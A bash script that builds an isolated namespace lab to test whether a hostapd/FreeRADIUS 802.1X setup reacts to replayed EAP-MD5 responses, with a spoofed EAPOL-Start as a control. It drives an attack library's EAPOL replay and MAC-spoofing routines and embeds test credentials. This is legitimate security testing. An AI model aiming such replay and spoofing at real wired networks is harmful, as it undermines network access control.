#!/usr/bin/env bash
# Isolated EAPOL replay lab (Linux only, needs root).
#
# Topology: one bridge (the LAN) with three hosts attached:
#
#   auth:     FreeRADIUS (local, 127.0.0.1:1812) and hostapd in wired mode, the 802.1X
#             authenticator on h-auth.
#   client:   the victim supplicant, wpa_supplicant with EAP-MD5 (user alice).
#   attacker: MACabre's EAPOL replay. It captures the victim's EAP responses while the victim
#             authenticates, then sends them again after the victim is authorized.
#
# Phases:
#   Phase 1 (capture and replay): the attacker captures the victim's EAP responses for
#            CAPTURE_SECONDS, while the victim authenticates. Then it replays them. The lab
#            counts the victim's lines in hostapd's log and the RADIUS requests before and
#            after the replay.
#   Phase 2 (control): the attacker sends one fresh EAPOL-Start from the victim's MAC. The
#            authenticator must react to it (a new EAP start for that MAC). This shows that
#            frames from the victim's MAC reach hostapd and are processed.
#
# Verdict:
#   The control must show a reaction. If the replay produced no new hostapd line for the
#   victim and no new RADIUS request, the authenticator ignored the replayed responses in
#   this configuration. If it produced either, the replay changed the authenticator's
#   state, and the output says so. Either verdict is conclusive only because the control
#   passed.
#
# What the lab shows: whether this hostapd and FreeRADIUS setup reacts to replayed EAP
# responses after authorization. It does not test vendor authenticators, replay during an
# active exchange, or other EAP methods.
#
# Requirements: FreeRADIUS with IPv4 listeners only, and the test user alice in its authorize
# file (see the EAPOL logoff spoofing lab). Nothing here touches the host's real interfaces.
#
# Usage:
#   sudo scripts/lab/eapol_replay_lab.sh
#   sudo CAPTURE_SECONDS=20 scripts/lab/eapol_replay_lab.sh
#
# Requirements: iproute2, hostapd, wpasupplicant, freeradius, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

if ! command -v ip >/dev/null 2>&1; then
    echo "Missing required tool: ip" >&2
    exit 1
fi
HOSTAPD="$(command -v hostapd 2>/dev/null || echo /usr/sbin/hostapd)"
WPA_SUPPLICANT="$(command -v wpa_supplicant 2>/dev/null || echo /usr/sbin/wpa_supplicant)"
FREERADIUS="$(command -v freeradius 2>/dev/null || echo /usr/sbin/freeradius)"
for tool in "$HOSTAPD" "$WPA_SUPPLICANT" "$FREERADIUS"; do
    if [[ ! -x "$tool" ]]; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done
RADIUS_DIR=/etc/freeradius/3.0
if ! grep -q '^alice' "$RADIUS_DIR/mods-config/files/authorize" 2>/dev/null; then
    echo "FreeRADIUS needs the test user alice in $RADIUS_DIR/mods-config/files/authorize." >&2
    exit 2
fi

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
CAPTURE_SECONDS="${CAPTURE_SECONDS:-15}"
WORK="$(mktemp -d)"

stop_lab() {
    for ns in auth client attacker; do
        for pid in $(ip netns pids "$ns" 2>/dev/null || true); do
            kill "$pid" 2>/dev/null || true
        done
    done
    for ns in attacker client auth lan; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

stop_lab

ip netns add lan
ip netns add auth
ip netns add client
ip netns add attacker

for pair in "auth:auth" "cli:client" "att:attacker"; do
    name="${pair%%:*}"
    ns="${pair##*:}"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
done

# group_fwd_mask 8 lets the bridge forward the 802.1X PAE group address.
ip netns exec lan ip link add br0 type bridge group_fwd_mask 8
ip netns exec lan ip link set br0 up
for name in auth cli att; do
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
done

ip netns exec auth ip link set lo up
ip netns exec auth ip link set h-auth up
ip netns exec client ip link set lo up
ip netns exec client ip link set h-cli up
ip netns exec attacker ip link set lo up
ip netns exec attacker ip link set h-att up

VICTIM_MAC="$(ip netns exec client cat /sys/class/net/h-cli/address)"

cat >"$WORK/hostapd.conf" <<EOF
driver=wired
interface=h-auth
logger_stdout=-1
logger_stdout_level=2
ieee8021x=1
eap_reauth_period=3600
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123
EOF

cat >"$WORK/supplicant.conf" <<EOF
ctrl_interface=$WORK/wpa
network={
    key_mgmt=IEEE8021X
    eap=MD5
    identity="alice"
    password="password"
    eapol_flags=0
}
EOF

cat >"$WORK/replay.py" <<'PY'
import os, threading
from macabre.attacks.eapol_replay import EapolReplayConfig, run_eapol_replay

def show(stats):
    print(f"{stats.captured} {stats.replayed}", flush=True)

run_eapol_replay(
    EapolReplayConfig(iface="h-att", victim_mac=os.environ["VICTIM_MAC"],
                      capture_seconds=int(os.environ["CAPTURE_SECONDS"])),
    threading.Event(),
    show,
)
print("done", flush=True)
PY

START_CODE='
import os
from macabre.attacks.eapol_start_flooding import EapolStartFloodingConfig, run_eapol_start_flooding
import threading
stats = run_eapol_start_flooding(
    EapolStartFloodingConfig(iface="h-att", frames=1, source_mac=os.environ["VICTIM_MAC"]),
    threading.Event(),
    lambda _: None,
)
print(stats.frames)
'

ip netns exec auth "$FREERADIUS" -X -d "$RADIUS_DIR" >"$WORK/radius.log" 2>&1 &
sleep 4
ip netns exec auth "$HOSTAPD" "$WORK/hostapd.conf" >"$WORK/hostapd.log" 2>&1 &
sleep 3
if [[ -z "$(ip netns pids auth 2>/dev/null)" ]]; then
    echo "hostapd or FreeRADIUS did not start. Logs:" >&2
    tail -10 "$WORK/hostapd.log" >&2
    exit 2
fi

victim_lines() {
    grep -c "$VICTIM_MAC" "$WORK/hostapd.log" 2>/dev/null || true
}
radius_requests() {
    grep -c "Received Access-Request" "$WORK/radius.log" 2>/dev/null || true
}
authenticated() {
    grep -c "STA $VICTIM_MAC IEEE 802.1X: authenticated" "$WORK/hostapd.log" 2>/dev/null || true
}

echo "Phase 1: capture during authentication, replay afterwards"
echo "  victim $VICTIM_MAC"
ip netns exec attacker env PYTHONPATH="$ROOT/src" VICTIM_MAC="$VICTIM_MAC" CAPTURE_SECONDS="$CAPTURE_SECONDS" \
    "$PY" "$WORK/replay.py" >"$WORK/replay.out" 2>&1 &
REPLAY_PID=$!
sleep 1
ip netns exec client "$WPA_SUPPLICANT" -D wired -i h-cli -c "$WORK/supplicant.conf" >"$WORK/supplicant.log" 2>&1 &

for _ in $(seq 1 60); do
    [[ "$(authenticated)" -ge 1 ]] && break
    sleep 1
done
if [[ "$(authenticated)" -lt 1 ]]; then
    echo "The victim did not authenticate during the capture. Result unreliable." >&2
    kill "$REPLAY_PID" 2>/dev/null || true
    exit 2
fi
echo "  victim authenticated"
sleep 1
PRE_LINES=$(victim_lines)
PRE_REQS=$(radius_requests)

for _ in $(seq 1 $(( CAPTURE_SECONDS + 20 ))); do
    grep -q '^done' "$WORK/replay.out" 2>/dev/null && break
    sleep 1
done
CAPTURED="$(grep -E '^[0-9]+ ' "$WORK/replay.out" | head -1 | cut -d' ' -f1 || true)"
CAPTURED="${CAPTURED:-0}"
REPLAYED="$(grep -E '^[0-9]+ ' "$WORK/replay.out" | tail -1 | cut -d' ' -f2 || true)"
REPLAYED="${REPLAYED:-0}"
sleep 4
POST_LINES=$(victim_lines)
POST_REQS=$(radius_requests)
EFFECT_LINES=$(( POST_LINES - PRE_LINES ))
EFFECT_REQS=$(( POST_REQS - PRE_REQS ))
echo "  EAP responses captured: $CAPTURED"
echo "  EAP responses replayed: $REPLAYED"
echo "  victim lines in hostapd's log around the replay: $EFFECT_LINES"
echo "  RADIUS requests around the replay: $EFFECT_REQS"
echo

echo "Phase 2: control, one fresh EAPOL-Start from the victim's MAC"
CONTROL_BEFORE_LINES=$(victim_lines)
CONTROL_BEFORE_REQS=$(radius_requests)
ip netns exec attacker env PYTHONPATH="$ROOT/src" VICTIM_MAC="$VICTIM_MAC" "$PY" -c "$START_CODE" >/dev/null 2>&1 || true
sleep 5
CONTROL_LINES=$(( $(victim_lines) - CONTROL_BEFORE_LINES ))
CONTROL_REQS=$(( $(radius_requests) - CONTROL_BEFORE_REQS ))
echo "  victim lines in hostapd's log after the start: $CONTROL_LINES"
echo "  RADIUS requests after the start: $CONTROL_REQS"
echo

if (( CAPTURED == 0 )); then
    echo "Capture: no EAP responses were captured. Result unreliable."
    exit 2
fi
if (( CONTROL_LINES == 0 && CONTROL_REQS == 0 )); then
    echo "Control: the authenticator did not react to a fresh EAPOL-Start from the victim's MAC. Result unreliable."
    exit 2
fi
if (( EFFECT_LINES == 0 && EFFECT_REQS == 0 )); then
    echo "Result: the replayed EAP responses produced no activity for the victim. The authenticator ignored $REPLAYED replayed response(s) in this configuration, while it reacted to a fresh EAPOL-Start from the same MAC."
else
    echo "Result: the replayed EAP responses changed the authenticator's state for the victim ($EFFECT_LINES new log line(s), $EFFECT_REQS RADIUS request(s)). The authenticator reacted to them."
fi
exit 0
